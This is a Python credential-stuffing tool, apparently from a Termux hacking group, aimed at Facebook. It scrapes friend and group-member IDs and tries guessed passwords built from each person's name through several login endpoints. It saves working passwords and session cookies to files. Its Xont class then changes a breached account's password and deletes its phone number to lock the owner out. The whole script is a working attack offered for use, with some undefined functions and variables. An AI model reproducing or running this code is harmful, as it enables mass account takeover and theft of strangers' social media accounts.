#By : https://t.me/KGF_TERMUX_TEAM

import lzma
import zlib
import codecs
import base64
_ = lambda __ : __import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(__[::-1])));


try:
    import re, os, uuid, sys, urllib, rich, requests, datetime, time, json, random, string, uuid, base64, platform, subprocess
    from concurrent.futures import ThreadPoolExecutor
    from rich.progress import Progress,TextColumn
    from bs4 import BeautifulSoup as parser
    from datetime import datetime as date
    from string import *
except Exception as e:
    exit(f'\n Error: {e}')
    
P, H, M = '\x1b[1;97m', '\x1b[1;92m', '\x1b[1;91m'
M2, H2, K2, B2, P2 = "[#FF0000]", "[#00FF00]", "[#FFFF00]", "[#00C8FF]", "[#FFFFFF]"
ua = "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36"
loop, ok, cp, Dump, uaz, UbahData, Tampung, MethodType = 0,[],[],[],[],[],[],[];ses = requests.Session()
password_list,password_input= [],[]
pwpluss,pwnya=[],[]

#from dump import Group as GROUP, friendz as FriendsMe
from rich import print as zprint
from rich.tree import Tree

def MyUserAgentApi():
	Android = random.choice(['9|PPR1','10|QP1A','11|RP1A','12|SP1A','13|TP1A'])
	Faz, Fax = Android.split("|")[0],Android.split("|")[1]
	Build = "Build/{}.{}.0{}".format(Fax,random.randint(111111,333333), random.randint(10,20))
	return f"Dalvik/2.1.0 (Linux; U; Android {str(random.randint(4,12))}; Moto Build/QP1A.244982.977) [FBAN/Orca-Android;FBAV/{str(random.randint(255,355))}.288.0.0.15.118;FBPN/com.facebook.orca;FBLC/pl_PL;FBBV/253310653;FBCR/PLAY (T-Mobile);FBMF/Xiaomi;FBBD/xiaomi;FBDV/{random.choice(uaz)};FBSV/{str(random.randint(4,12))};FBCA/arm64-v8a:null;FBDM/"+"{density=2.75,width=1080,height=2130};FB_FW/1;FBBK/1;]"
	#Logo ____âž¤âž¤[KGF_TEM_TXTðŸ˜…ðŸ˜…]
def Logo():
	os.system('cls' if os.name == 'nt' else 'clear')
	print(f'  {M}___  ____  ____  _  _ \n / __)(  __)(  _ \( \/ )\n( (__  ) _)  ) _ ( )  ( \n \___)(__)  (____/(_/\_){P}')

def Login():
	while True:
		try:
			Logo();print(f'\n{M}Informasi{P}\n[{M}!{P}] Untuk mendapatkan akses token hubungkan\n[{M}!{P}] Akun Facebook anda dengan Akun Instagram');print(f'\n[{M}!{P}] silahkan masukan cookiemu, pastikan autentikasi tidak aktif')
			cookies = input(f'[{M}!{P}] Masukan Cookies: ')
			with requests.Session() as r:
				params = {'client_id': '124024574287414','wants_cookie_data': 'true','origin': '1','input_token': '','sdk': 'joey','redirect_uri': 'https://www.instagram.com/fajarky_15/'}
				r.headers.update({'Accept-Language': 'id,en;q=0.9','User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36','Referer': 'https://www.instagram.com/','Host': 'www.facebook.com','Sec-Fetch-Mode': 'cors','Accept': '*/*','Connection': 'keep-alive','Sec-Fetch-Site': 'cross-site','Sec-Fetch-Dest': 'empty','Origin': 'https://www.instagram.com','Accept-Encoding': 'gzip, deflate'})
				response = r.get('https://www.facebook.com/x/oauth/status', params = params, cookies = {'cookie': cookies})
				if '"access_token":' in str(response.headers):
					acctoken = re.search('"access_token":"(.*?)"', str(response.headers)).group(1)
					userid = re.search('"user_id":"(\d+)"', str(response.headers)).group(1)
					open('Data/Token.txt','w').write(acctoken);open('Data/Cookie.txt','w').write(cookies)
				else:
					print(f'[{M}!{P}] Cookie Tidak di temukan, Silahkan Login')
				print(f'\n[{M}!{P}] {H} Log-in Berhasil {M}{userid}{P}')
				print(f'[{M}!{P}] Token : {H}{acctoken}');time.sleep(2);MenuTools()
		except (Exception) as e:
			print(f'{str(e).title()}');exit()

def MenuTools():
	Logo()
	try:
		cookie, token = open('Data/Cookie.txt','r').read(),open('Data/Token.txt','r').read()
	except(FileNotFoundError) as e:
		print(f'{str(e).title()}');time.sleep(2);Login()
	print(f'\n[{M}1{P}] Dump {H}Friends{P}')
	print(f'[{M}2{P}] Dump {H}Member Grup{P}')
	print(f'[{M}0{P}] Remove {M}Token/Cookie{P}')
	Choice2(cookie, token)

def Choice(cookie, token):
	while True:
		x = input('\n\t@Jar_khafi_ ')
		if x in ['1','01']:TemanKu(cookie, token);break
		elif x in ['2','02']:Groups(cookie);break
		elif x in ['3','03']:File();break
		elif x in ['0','00']:os.remove('Data/Token.txt');os.remove('Data/Cookie.txt')
		else: continue

def Choice2(cookie, token):
	x = input('\n\t@Jar_khafi_ ')
	if x in ['1','01']:
		print(f'\n[{M}!{P}] Masukan uid/username \n[{M}!{P}] Gunakan "," (Koma) Untuk uid berikut nya')
		user = input(f'[{M}?{P}] Uid User: ')
		for User in user.split(','):
			try:
				if User.isnumeric() is False: Userid = ConvertName(User, cookie)
				else:Userid = User
				get = requests.get('https://graph.facebook.com/{}'.format(Userid),params = {'access_token': token,'fields': "friends"}, headers = {"user-agent": ua}, cookies={'cookies':cookie}).json()
				for i in get["friends"]["data"]:
					Dump.append(i["id"]+"|"+i["name"])
				print(f'[{M}!{P}] mengumpulkan uid {User}|{M}{len(Dump)}{P}                              ', end='\r');time.sleep(0.00001)
			except (KeyError,IOError):print(f'[{M}!{P}] uid {M}{User}{P} Private                                   ', end='\r');time.sleep(0.00001)
		print();Method()
	
	elif x in ['2','02']:
		print(f'\n[{M}!{P}] Masukkan uid grup, pastikan grup publik')
		user = input(f'[{M}?{P}] Uid Group: ')
		try:
			link = requests.get(f"https://mobile.facebook.com/groups/{user}", cookies={'cookies':cookie}).text
			if "Halaman yang Anda minta tidak ditemukan." in link:
				print(f'[{M}!{P}] grup dengan uid > {user} < private')
				time.sleep(3);MenuTools()
			elif "Anda Diblokir Sementara" in link:
				print('[{M}!{P}] facebook membatasi setiap aktivitas anda')
				time.sleep(3);MenuTools()
			elif "Konten Tidak Ditemukan" in link:
				print(f'[{M}!{P}] grup dengan uid > {user} < private')
				time.sleep(3);MenuTools()
			else:
				DumpGrup(f"https://mobile.facebook.com/groups/{user}")
		except(requests.exceptions.ConnectionError,requests.exceptions.ChunkedEncodingError,requests.exceptions.ReadTimeout) as e:
			print(f"{str(e).title()}")
		print();Method()
	
	elif x in ['3','03']:
		print(f'\n[{M}!{P}] Masukkan uid grup, pastikan grup publik')
		user = input(f'[{M}?{P}] Uid Group: ')
		Dump_user().Dump_MemberGrup(f"https://mbasic.facebook.com/groups/{user}")
		print();Method()
		
	elif x in ['0','00']:
		os.remove('Data/Token.txt')
		os.remove('Data/Cookie.txt')
		
def TemanKu(cookie, token):
	user = input(f'\n[{M}?{P}] masukan id: ')
	Asu = FriendsMe.MAIN().DumpFriens(user, cookie, token, ua)
	if Asu is None:print("[!] Teman Tidak di temukan ")
	else:
		for zx in Asu:
			Dump.append(zx)
	print();Method()
	
def Groups(cookie):
	print(f'\n{P}[{M}!{P}] Masukkan uid grup, pastikan grup publik')
	user = input(f'{P}[{M}?{P}] uid groups: ')
	Mem = GROUP.MAIN().Dumper(user, cookie, '')
	if Mem is None:print("[!] Member Tidak Di Temukan")
	else:
		for zar in Mem:
			Dump.append(zar)
	print();Method()
	
def File():
	print(f'\n{P}[{M}!{P}] Masukan nama file atau lokasi (/sdcard/dump.txt)')
	file = input(f'[{M}?{P}] File dump : ')
	try:
		for xzz in open(file,'r').read().splitlines():
			try:
				id, nama = xzz.split('|')
				Dump.append(xzz)
			except ValueError:
				exit(f'\n{P}[{M}Ã—{P}] Pemisahan salah.')
	except FileNotFoundError:
		exit(f'\n{P}[{M}Ã—{P}] File tidak di temukan')
	Method()

def DumpGrup(link):
	try:
		coki = open('Data/Cookie.txt','r').read()
	except(FileNotFoundError) as e:
		print(f'{str(e).title()}');time.sleep(2);Login()
	try:
		data = requests.get(link, cookies={'cookies': coki}).text
		cari = re.findall('\<h3\ class\=\".*?">\<span>\<strong>\<a\ href\=\"/(.*?)\">(.*?)</a\>\</strong\>', data)
		for x in cari:
			if "profile.php?" in x[0]:
				Dump.append(re.findall("id=(.*?)&amp;eav", x[0])[0]+"|"+x[1])
			else:
				Dump.append(re.findall("(.*?)\?eav", x[0])[0]+"|"+x[1])
			print(f'[{M}!{P}] mengumpulkan uid {M}{len(Dump)}{P}                              ', end='\r')
			time.sleep(000000.003)
		if "Lihat Postingan Lainnya" in data:
			DumpGrup("https://mobile.facebook.com"+parser(data, "html.parser").find("a", string="Lihat Postingan Lainnya").get("href"))
	except:pass
	
def Method():
	for acak in Dump:xx = random.randint(0,len(Tampung));Tampung.insert(xx,acak)
	print(f'\n\tsuccess dump {H}{len(Dump)}{P}')
	print(f'\n[{M}1{P}] method {H}async wbloks{P}\n[{M}2{P}] method {H}graph-api{P}\n[{M}3{P}] method {H}messenger{P}');Main()

def Main():
	while True:
		x = input('\n\t@Jar_khafi_ ')
		if x in ['1','01']:MethodType.append('1');break
		elif x in ['2','02']:MethodType.append('2');break
		elif x in ['3','02']:MethodType.append('3');break
		else: continue
	StartCrack()
		
def Ubahdata():
	dat = input(f'\n{P}[{M}!{P}] Ubah password ({H}y{P}/{M}t{P}): ').lower()
	if dat in ['ya','y']:UbahData.append(True)
	else:UbahData.append(False)
	StartCrack()

def StartCrack():
	global Fajar,Rara
	new = date.now()
	hari, bulan, tahun = new.day, new.month, new.year
	Kontol_Alok = '%s|%s|%s'%(hari,bulan,tahun)
	pw_manual=input(f'\n[{M}Â°{P}] input password tambahan : ')
	password_manual=pw_manual.split(',')
	for xpw in password_manual:
		pwnya.append(xpw)
	print(f'[{M}Â°{P}] {len(Tampung)} {H}results save in folder Data{P}')
	print(f'[{M}Â°{P}] Start : {Kontol_Alok}\n')
	Fajar = Progress(TextColumn('{task.description}'))
	Rara = Fajar.add_task('',total=len(Tampung))
	with Fajar:
		with ThreadPoolExecutor(max_workers=30) as ASF:
			for user in Tampung:
				uid, nama = user.split('|')[0],user.split('|')[1].lower()
				depan = nama.split(" ")[0]
				pwd = []
				try:
					if len(nama) <=5:
						if len(depan) <=1 or len(depan) <=2:pass
						else:
							pwd = [nama,depan+"123",nama+"1234",nama+"12345"]
					else:
						pwd = [nama,depan+"123",nama+"1234",nama+"12345"]
					for xpwd in pwnya:
						pwd.append(xpwd)
					if '1' in MethodType:ASF.submit(Crack, uid, pwd)
					elif '2' in MethodType:ASF.submit(Crack2, uid, pwd)
					elif '3' in MethodType:ASF.submit(Crack2, uid, pwd)
					else:ASF.submit(CrackWblock, uid, pwd)
				except:pass
	if len(ok) == 0 and len(cp) == 0:
		print(f"{P}[{M}!{P}] {M}Kamu Tidak Mendapatkan hasil{P}")
	else:
		print(f"{P}[{M}!{P}] Kamu mendapatkan akun OK-{H}{len(ok)}{P}akun CP-{M}{len(cp)}{P}");exit()
	
def Crack(uid, pwd):
	global loop,ok,cp
	Fajar.update(Rara,description=f"[bold white]@fajarkhafi_ {str(loop)} Ok-[bold green]{len(ok)}[bold white] Cp-[bold yellow]{len(cp)} [bold red]-As1")
	Fajar.advance(Rara)
	AndroidUserAgent = MyUa()
	for pwc in pwd:
		with requests.Session() as r:
			try:
				url = 'https://m.facebook.com/login.php?skip_api_login=1&api_key=320498812960175&kid_directed_site=0&app_id=320498812960175&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv16.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D320498812960175%26cbt%3D1715179262058%26e2e%3D%257B%2522init%2522%253A1715179262058%257D%26ies%3D1%26sdk%3Dandroid-16.0.0%26sso%3Dchrome_custom_tab%26nonce%3D22181fc9-51bf-4d65-bfb2-451d3461a014%26scope%3Dopenid%252Cpublic_profile%252Cemail%26state%3D%257B%25220_auth_logger_id%2522%253A%25229a83454e-9b45-4878-87d5-4672610301c2%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522ps5hr2n20fafga6m4nr5%2522%257D%26code_challenge_method%3DS256%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfb320498812960175%253A%252F%252Fauthorize%252F%26auth_type%3Drerequest%26response_type%3Did_token%252Ctoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26code_challenge%3DkA9sNNTr9flKN4CZYkUrkurz8bF4sTMg2LpUlOitd8Q%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D9a83454e-9b45-4878-87d5-4672610301c2%26tp%3Dunspecified&cancel_url=fb320498812960175%3A%2F%2Fauthorize%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%25229a83454e-9b45-4878-87d5-4672610301c2%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522ps5hr2n20fafga6m4nr5%2522%257D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr'
				srequest = r.get(url)
				payload = {
					'm_ts': re.search('name="m_ts" value="(.*?)"', str(srequest.text)).group(1),
					'li': re.search('name="li" value="(.*?)"', str(srequest.text)).group(1),
					'try_number': '0',
					'unrecognized_tries': '0',
					'email': uid,
					'prefill_contact_point': uid,
					'prefill_source': 'browser_dropdown',
					'prefill_type': 'password',
					'first_prefill_source': 'browser_dropdown',
					'first_prefill_type': 'contact_point',
					'had_cp_prefilled': 'true',
					'had_password_prefilled': 'true',
					'is_smart_lock': 'false',
					'bi_xrwh': '0',
					'bi_wvdp': '{"hwc":true,"hwcr":false,"has_dnt":true,"has_standalone":false,"wnd_toStr_toStr":"function toString() { [native code] }","hasPerm":true,"permission_query_toString":"function query() { [native code] }","permission_query_toString_toString":"function toString() { [native code] }","has_seWo":true,"has_meDe":true,"has_creds":true,"has_hwi_bt":false,"has_agjsi":false,"iframeProto":"function get contentWindow() { [native code] }","remap":false,"iframeData":{"hwc":true,"hwcr":false,"has_dnt":true,"has_standalone":false,"wnd_toStr_toStr":"function toString() { [native code] }","hasPerm":true,"permission_query_toString":"function query() { [native code] }","permission_query_toString_toString":"function toString() { [native code] }","has_seWo":true,"has_meDe":true,"has_creds":true,"has_hwi_bt":false,"has_agjsi":false}}',
					'encpass': '#PWD_BROWSER:0:{}:{}'.format(str(time.time())[:10],pwc),
					'jazoest': re.search('name="jazoest" value="(.*?)"', str(srequest.text)).group(1),
					'lsd': re.search('name="lsd" value="(.*?)"', str(srequest.text)).group(1),
				}
				headers = {
					'Host': 'm.facebook.com',
					'content-length': '2161',
					'sec-ch-ua': '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
					'sec-ch-ua-mobile': '?1',
					'user-agent': AndroidUserAgent,
					'content-type': 'application/x-www-form-urlencoded',
					'x-fb-lsd': payload['lsd'],
					'sec-ch-ua-platform-version': '"11.0.0"',
					'x-asbd-id': '129477',
					'sec-ch-ua-full-version-list': '"Chromium";v="124.0.6367.113", "Google Chrome";v="124.0.6367.113", "Not-A.Brand";v="99.0.0.0"',
					'sec-ch-ua-model': '"Redmi Note 8"',
					'sec-ch-prefers-color-scheme': 'light',
					'sec-ch-ua-platform': '"Android"',
					'accept': '*/*',
					'origin': 'https://m.facebook.com',
					'sec-fetch-site': 'same-origin',
					'sec-fetch-mode': 'cors',
					'sec-fetch-dest': 'empty',
					'referer': url,
					'accept-encoding': 'gzip, deflate, br, zstd',
					'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
					'priority':'u=1, i'
				}
				post = r.post('https://m.facebook.com/login/device-based/login/async/?api_key=320498812960175&auth_token=c45b795ac8c702446358f2db6a11b3ef&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv16.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D320498812960175%26cbt%3D1715179262058%26e2e%3D%257B%2522init%2522%253A1715179262058%257D%26ies%3D1%26sdk%3Dandroid-16.0.0%26sso%3Dchrome_custom_tab%26nonce%3D22181fc9-51bf-4d65-bfb2-451d3461a014%26scope%3Dopenid%252Cpublic_profile%252Cemail%26state%3D%257B%25220_auth_logger_id%2522%253A%25229a83454e-9b45-4878-87d5-4672610301c2%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522ps5hr2n20fafga6m4nr5%2522%257D%26code_challenge_method%3DS256%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfb320498812960175%253A%252F%252Fauthorize%252F%26auth_type%3Drerequest%26response_type%3Did_token%252Ctoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26code_challenge%3DkA9sNNTr9flKN4CZYkUrkurz8bF4sTMg2LpUlOitd8Q%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D9a83454e-9b45-4878-87d5-4672610301c2%26tp%3Dunspecified&refsrc=deprecated&app_id=320498812960175&cancel=fb320498812960175%3A%2F%2Fauthorize%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%25229a83454e-9b45-4878-87d5-4672610301c2%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522ps5hr2n20fafga6m4nr5%2522%257D%23_%3D_&lwv=100', data=payload, headers=headers)
				if 'c_user' in r.cookies.get_dict():
					auth = ';'.join(['%s=%s'%(x,y) for x,y in r.cookies.get_dict().items()])
					tree = Tree("",style="bold green")
					tree.add(f'{P2}useruid: {H2}{uid}')
					tree.add(f'{P2}userpw: {H2}{pwc}')
					tree.add(f'{H2}{random.choice(uaz)}').add(f'{H2}{auth}')
					zprint(tree)
					with open('/sdcard/Ress/Ok-Async4.txt',mode='a', encoding='utf-8') as save:
						save.write('%s|%s|%s\n'%(uid,pwc,auth))
					save.close()
					ok.append(uid)
					break
				elif 'checkpoint' in r.cookies.get_dict():
					cp.append(uid)
					with open('/sdcard/Ress/Cp-Async.txt',mode='a', encoding='utf-8') as save:
						save.write('%s|%s\n'%(uid,pwc))
					save.close()
					break
				else:continue
			except requests.exceptions.ConnectionError:time.sleep(20)
	loop+=1

def Crack2(uid, pwd):
	global loop,ok,cp
	Fajar.update(Rara,description=f"[bold white]@fajarkhafi_ {str(loop)} Ok-[bold green]{len(ok)}[bold white] Cp-[bold yellow]{len(cp)} [bold red]-As2")
	Fajar.advance(Rara)
	AndroidUserAgent = MyUa()
	for pwc in pwd:
		with requests.Session() as r:
			try:
				req = r.get('https://m.alpha.facebook.com/login/?next=https%3A%2F%2Fdevelopers.secure.facebook.com%2Fdocs%2Fdevelopment%2Fbuild-and-test&refsrc=deprecated&_rdr').text
				payload = {
					'm_ts': re.search('name="m_ts" value="(.*?)"', str(req)).group(1),
					'li': re.search('name="li" value="(.*?)"', str(req)).group(1),
					'try_number': '0',
					'unrecognized_tries': '0',
					'jazoest': re.search('name="jazoest" value="(.*?)"', str(req)).group(1),
					'lsd': re.search('name="lsd" value="(.*?)"', str(req)).group(1),
					'email': uid,
					'pass': pwc,
					'prefill_contact_point': uid,
					'prefill_source': 'browser_dropdown',
					'prefill_type': 'password',
					'first_prefill_source': 'browser_dropdown',
					'first_prefill_type': 'contact_point',
					'had_cp_prefilled': 'true',
					'had_password_prefilled': 'true',
					'is_smart_lock': 'false',
					'bi_xrwh': '0'
				}
				headers = {
					'Host': 'm.alpha.facebook.com',
					'content-length': '2169',
					'sec-ch-ua': '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
					'sec-ch-ua-mobile': '?1',
					'user-agent': AndroidUserAgent,
					'content-type': 'application/x-www-form-urlencoded',
					'x-fb-lsd': payload['lsd'],
					'sec-ch-ua-platform-version': '"11.0.0"',
					'x-asbd-id': '129477',
					'sec-ch-ua-full-version-list': '"Chromium";v="124.0.6367.113", "Google Chrome";v="124.0.6367.113", "Not-A.Brand";v="99.0.0.0"',
					'sec-ch-ua-model': '"Redmi Note 8"',
					'sec-ch-prefers-color-scheme': 'light',
					'sec-ch-ua-platform': '"Android"',
					'accept': '*/*',
					'origin': 'https://m.alpha.facebook.com',
					'sec-fetch-site': 'same-origin',
					'sec-fetch-mode': 'cors',
					'sec-fetch-dest': 'empty',
					'referer': 'https://m.alpha.facebook.com/login/?next=https%3A%2F%2Fdevelopers.secure.facebook.com%2Fdocs%2Fdevelopment%2Fbuild-and-test&ref=dbl&fl&login_from_aymh=1',
					'accept-encoding': 'gzip, deflate, br, zstd',
					'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
					'priority':'u=1, i'
				}
				exec = r.post('https://m.alpha.facebook.com/login/device-based/login/async/?next=https%3A%2F%2Fdevelopers.secure.facebook.com%2Fdocs%2Fdevelopment%2Fbuild-and-test&refsrc=deprecated&lwv=100', data = payload, headers=headers)
				if 'c_user' in r.cookies.get_dict():
					auth = ';'.join(['%s=%s'%(x,y) for x,y in r.cookies.get_dict().items()])
					print(f'{H}{uid}|{pwc}|{auth}{P}\n')
					with open('/sdcard/Ress/Ok-Async4.txt',mode='a', encoding='utf-8') as save:
						save.write('%s|%s|%s\n'%(uid,pwc,auth))
					save.close()
					ok.append(uid)
					break
				elif 'checkpoint' in r.cookies.get_dict():
					cp.append(uid)
					with open('/sdcard/Ress/Cp-Async.txt',mode='a', encoding='utf-8') as save:
						save.write('%s|%s\n'%(uid,pwc))
					save.close()
					break
				else:continue
			except requests.exceptions.ConnectionError:time.sleep(20)
	loop+=1
	
def CrackApi(uid, pwd):
	global loop, ok, cp
	with requests.Session() as r:
		for pwc in pwd:
			try:
				ua = MyUserAgentApi()
				data = {'adid':str(uuid.uuid4()),'format':'json','device_id':str(uuid.uuid4()),'email':uid,'password': f'#PWD_FB4A:0:{int(time.time())}:{pwc}','generate_analytics_claim':'1','community_id':'','linked_guest_account_userid':'','cpl':'true','try_num':'1','family_device_id':str(uuid.uuid4()),'secure_family_device_id':str(uuid.uuid4()),'credentials_type':'password','fb4a_shared_phone_cpl_experiment':'fb4a_shared_phone_nonce_cpl_at_risk_v3','fb4a_shared_phone_cpl_group':'enable_v3_at_risk','enroll_misauth':'false','generate_session_cookies':'1','error_detail_type':'button_with_disabled','source':'login','generate_machine_id':'1','jazoest':'22518','meta_inf_fbmeta':'V2_UNTAGGED','advertiser_id':str(uuid.uuid4()),'encrypted_msisdn':'','currently_logged_in_userid':'0','locale':'id_ID','client_country_code':'ID','fb_api_req_friendly_name':'authenticate','fb_api_caller_class':'Fb4aAuthHandler','api_key':'882a8490361da98702bf97a021ddc14d','sig':'f2dc7dc0c16ecde068dcc34d0290acc4','access_token':'350685531728|62f8ce9f74b12f84c123cc23437a4a32'}
				head = {'Host': 'b-graph.facebook.com','X-Fb-Request-Analytics-Tags': json.dumps({"network_tags":{"product":"350685531728","retry_attempt":"0"},"application_tags":"unknown"}),'X-Fb-Friendly-Name': 'authenticate','Zero-Rated': '0','X-Fb-Net-Hni': '51002','X-Fb-Connection-Quality': 'EXCELLENT','Authorization': 'OAuth null','X-Fb-Sim-Hni': '51002','Content-Type': 'application/x-www-form-urlencoded','X-Fb-Connection-Type': 'WIFI','X-Fb-Device-Group': '4137','X-Tigon-Is-Retry': 'false','Priority': 'u=3,i','X-Fb-Http-Engine': 'Liger','X-Fb-Client-Ip': 'true','X-Fb-Server-Cluster': 'true'}
				head.update({'User-Agent':ua})
				req1 = r.post('https://b-graph.facebook.com/auth/login', data=data, headers=head).json()
				if 'session_key' in req1:
					auth = ';'.join([x['name']+'='+x['value'] for x in req1['session_cookies']])
					if True in UbahData:
						Fac = Xont().UbahSandi(pwc, 'STOK123#', auth)
						pwz = pwc if Fac is False else Fac
						Nom = Xont().HapusNomor(auth, pwz)
						tree = Tree("",style="bold green")
						tree.add(f'{P2}useruid: {H2}{uid}')
						tree.add(f'{P2}userpw: {M2}{pwc}{P2} --> {H2}{pwz}')
						tree.add(f'{H2}{random.choice(uaz)}').add(f'{H2}{auth}')
						zprint(tree)
					else:
						tree = Tree("",style="bold green")
						tree.add(f'{P2}username : {H2}{uid}')
						tree.add(f'{P2}password : {H2}{pwc}').add(f'{H2}{auth}')
						zprint(tree)
					with open('/sdcard/Ress/Ok-Graph.txt',mode='a', encoding='utf-8') as save:
						save.write('%s|%s|%s\n'%(uid,pw,kuki))
					save.close()
					ok.append(uid)
					break
				elif 'www.facebook.com' in req1['error']['message']:
					cp.append(uid)
					with open('/sdcard/Ress/Cp-Graph.txt',mode='a', encoding='utf-8') as save:
						save.write('%s|%s\n'%(uid,pw))
					save.close()
					break
				else:continue
			#except Exception as e:print(e)
			except requests.exceptions.ConnectionError:time.sleep(20)
		loop+=1
		Fajar.update(Rara,description=f"[bold white]@fajar_khafi_ {str(loop)} Ok-[bold green]{len(ok)}[bold white] Cp-[bold yellow]{len(cp)} {random.choice(uaz)}")
		Fajar.advance(Rara)
		
class Xont:
   def __init__(self):pass
   def UbahSandi(self, old, new, cookies):
       try:
           req = requests.get('https://accountscenter.facebook.com/password_and_security/password/change', cookies={'cookie':cookies}).text
           self.old = f'#PWD_BROWSER:0:{int(time.time())}:{old}'
           self.new = f'#PWD_BROWSER:0:{int(time.time())}:{new}'
           self.data = {
                'av':re.search('{"actorID":"(\d+)"',str(req)).group(1),
                '__user':re.search('{"actorID":"(\d+)"',str(req)).group(1),
                '__hs':re.search('"haste_session":"(.*?)"',str(req)).group(1),
                '__rev':re.search('{"rev":(\d+)}',str(req)).group(1),
                'fb_dtsg':re.search('"DTSGInitData",\[\],{"token":"(.*?)"',str(req)).group(1),
                'jazoest':re.search('jazoest=(\d+)',str(req)).group(1),
                'lsd':re.search('"LSD",\[\],{"token":"(.*?)"}', str(req)).group(1),
                '__spin_r':re.search('"__spin_r":(\d+)',str(req)).group(1),
                '__spin_t':re.search('"__spin_t":(\d+)',str(req)).group(1),
                'fb_api_caller_class':'RelayModern',
                'fb_api_req_friendly_name':'useFXSettingsChangePasswordMutation',
                '__a':'1',
                '__ccg':'GOOD',
                'server_timestamps':True,
                'doc_id':'4872350656193366',
                'variables':'{"account_id":"'+re.search('{"actorID":"(\d+)"',str(req)).group(1)+'","account_type":"FACEBOOK","current_password_enc":{"sensitive_string_value":"'+self.old+'"},"new_password_enc":{"sensitive_string_value":"'+self.new+'"},"new_password_confirm_enc":{"sensitive_string_value":"'+self.new+'"},"client_mutation_id":"63000686-cf17-46b6-a962-636bba09b5b6"}'
           }
           self.head = {'x-fb-friendly-name': 'useFXSettingsChangePasswordMutation','x-fb-lsd': self.data['lsd']}
           self.req1 = requests.post('https://accountscenter.facebook.com/api/graphql/', cookies={'cookie':cookies},  data=self.data, headers=self.head).json()
           meki = self.req1['data']['xfb_change_password']['success']
           if meki == True:
              return str(new)
           else:return False
       except Exception as e:print();return False
       except (AttributeError,KeyError,requests.exceptions.ConnectionError):
           return False

   def HapusNomor(self,cokie, password):
       try:
           req = requests.get('https://accountscenter.facebook.com/personal_info/contact_points', cookies={'cookie':cokie}).text
           try:num = re.search('"contact_point_type":"PHONE_NUMBER","normalized_contact_point":"(.*?)"', str(req)).group(1)
           except:return None
           else:
               self.data = {
                   'av':re.search('{"actorID":"(\d+)"',str(req)).group(1),
                   '__user':re.search('{"actorID":"(\d+)"',str(req)).group(1),
                   '__hs':re.search('"haste_session":"(.*?)"',str(req)).group(1),
                   '__rev':re.search('{"rev":(\d+)}',str(req)).group(1),
                   'fb_dtsg':re.search('"DTSGInitData",\[\],{"token":"(.*?)"',str(req)).group(1),
                   'jazoest':re.search('jazoest=(\d+)',str(req)).group(1),
                   'lsd':re.search('"LSD",\[\],{"token":"(.*?)"}', str(req)).group(1),
                   '__spin_r':re.search('"__spin_r":(\d+)',str(req)).group(1),
                   '__spin_t':re.search('"__spin_t":(\d+)',str(req)).group(1),
                   'fb_api_caller_class':'RelayModern',
                   '__a':'1',
                   '__ccg':'GOOD',
                   'server_timestamps':True,
                   'fb_api_req_friendly_name':'FXAccountsCenterDeleteContactPointMutation',
                   'variables':'{"normalized_contact_point":"'+num+'","contact_point_type":"PHONE_NUMBER","selected_accounts":["'+re.search('{"actorID":"(\d+)"',str(req)).group(1)+'"],"client_mutation_id":"mutation_id_1705665618630","family_device_id":"device_id_fetch_datr"}',
                   'doc_id':'6716611361758391'
               }
               self.agen = MyUa()
               self.head = {'Host': 'accountscenter.facebook.com','user-agent': self.agen,'x-fb-friendly-name': 'FXAccountsCenterDeleteContactPointMutation','x-fb-lsd': self.data['lsd']}
               self.req1 = requests.post('https://accountscenter.facebook.com/api/graphql/', cookies={'cookie':cokie}, data=self.data, headers=self.head).json()
               if 'challenge_type' in str(self.req1):
                  type = re.search('"challenge_type":"(.*?)"}',str(self.req1)).group(1)
                  user = self.data['av']
                  pswd = f'#PWD_BROWSER:0:{int(time.time())}:{password}'
                  if 'password' in str(type):
                      self.data.update({
                          'fb_api_req_friendly_name':'FXPasswordReauthenticationMutation',
                          'variables':'{"input":{"account_id":'+user+',"account_type":"Facebook","password":{"sensitive_string_value":"'+pswd+'"},"actor_id":"'+user+'","client_mutation_id":"1"}}',
                          'doc_id':'5864546173675027'})
                      self.head.update({'x-fb-friendly-name': 'FXPasswordReauthenticationMutation','x-fb-lsd': self.data['lsd']})
                      self.head.pop('user-agent')
                      self.req2 = requests.post('https://accountscenter.facebook.com/api/graphql/', cookies={'cookie':cokie}, data=self.data, headers=self.head).json()
                      self.meme = self.req2['data']['xfb_password_reauth_fb_only']
                      if self.meme == None:return None
                      elif self.meme == True:self.HapusNomor(cokie, password)
                      else:return None
                  elif 'block' in str(type):return None
                  else:return None
               else:return str(num)
